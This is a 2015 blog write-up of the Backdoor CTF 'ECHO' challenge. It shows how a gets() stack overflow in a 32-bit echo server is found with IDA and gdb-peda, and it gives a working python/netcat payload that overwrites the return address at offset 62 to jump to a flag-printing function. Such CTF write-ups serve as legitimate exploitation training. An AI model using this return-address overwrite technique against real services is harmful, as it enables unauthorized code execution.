---
layout: post
title: "Backdoor CTF 2015 - ECHO Writeup"
date: 2015-04-03 02:12:58 +0430
comments: false
categories: ctf backdoor bianry exploit bof
---

**Backdoor 2015 ECHO Writeup**  
**Point = 100**  
**Category = Binary**  

> Little Suzie started learning C. She created a simple program that echo's back whatever you input. Here is the binary file. The vampire came across this service on the internet. nc hack.bckdr.in 8002. Reports say he found a flag. See if you can get it.

```
$ file echo
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=15ec07e5664a13e94069c818141cc9f70591d0f0, not stripped
```

As it seems we have a 32bit binary as a ECHO server. the output confirms this:

```
$ nc hack.bckdr.in 8002
GeeksSpeak
ECHO: GeeksSpeak
```

opening the binary in IDA shows us that the main function calls test() as we can see the psuedo-code below :

<!-- more -->
```
int test()
{
  char s; // [sp+1Eh] [bp-3Ah]@1

  gets(&s);
  return fprintf(_bss_start, "ECHO: %s\n", &s);
}

```

It's an obvious Stack buffer overflow. without loosing time i loaded it into *gdb* and used  cyclic pattern to find the offset:

```
$ gdb ./echo -q
Reading symbols from ./echo...(no debugging symbols found)...done.
gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ shell echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' > echo.test
gdb-peda$ r < echo.test 
Starting program: /home/hamidx9/ctf/backdoor/echo < echo.test
ECHO: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.
[-----------------------------------------------------------------------------------------------------------registers-----------------------------------------------------------------------------------------------------------]
EAX: 0x6b (b'k')
EBX: 0xf7fae000 --> 0x1a8da8 
ECX: 0x6b (b'k')
EDX: 0xf7faf86c --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41324141 (b'AA2A')
ESP: 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
EIP: 0x41414841 (b'AHAA')
[-------------------------------------------------------------------------------------------------------------code--------------------------------------------------------------------------------------------------------------]
Invalid $PC address: 0x41414841
[-------------------------------------------------------------------------------------------------------------stack-------------------------------------------------------------------------------------------------------------]
00:0000| esp 0xffffcdd0 ("dAA3AAIAAeAA4AA"...)
01:0004|     0xffffcdd4 ("AAIAAeAA4AAJAAf"...)
02:0008|     0xffffcdd8 ("AeAA4AAJAAfAA5A"...)
03:0012|     0xffffcddc ("4AAJAAfAA5AAKAA"...)
04:0016|     0xffffcde0 ("AAfAA5AAKAAgAA6"...)
05:0020|     0xffffcde4 ("A5AAKAAgAA6AAL")
06:0024|     0xffffcde8 ("KAAgAA6AAL")
07:0028|     0xffffcdec ("AA6AAL")
[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]
Legend: stack, code, data, heap, rodata, value
Stopped reason: SIGSEGV
0x41414841 in ?? ()
gdb-peda$ pattern_offset 'AHAA'
AHAA found at offset: 62
gdb-peda$ 

```

So the `offset = 62`. but where should we jump? IDA shows us there is another function named `sample` which open `flag.txt` and print its content. All have to do is to call `sample` with address = *0x0804854d*.

Final payload looks like below :

```
[A*62] + [0x0804854d in little endian]
```

And finally we've got the flag:

```
$ python -c 'import struct; q=lambda x: struct.pack("<I", x); print "A"*62+q(0x0804854d)' | nc hack.bckdr.in 8002
ECHO: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM�
96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d5bc1a129a
```

And another 100 pt.

HAMIDx9
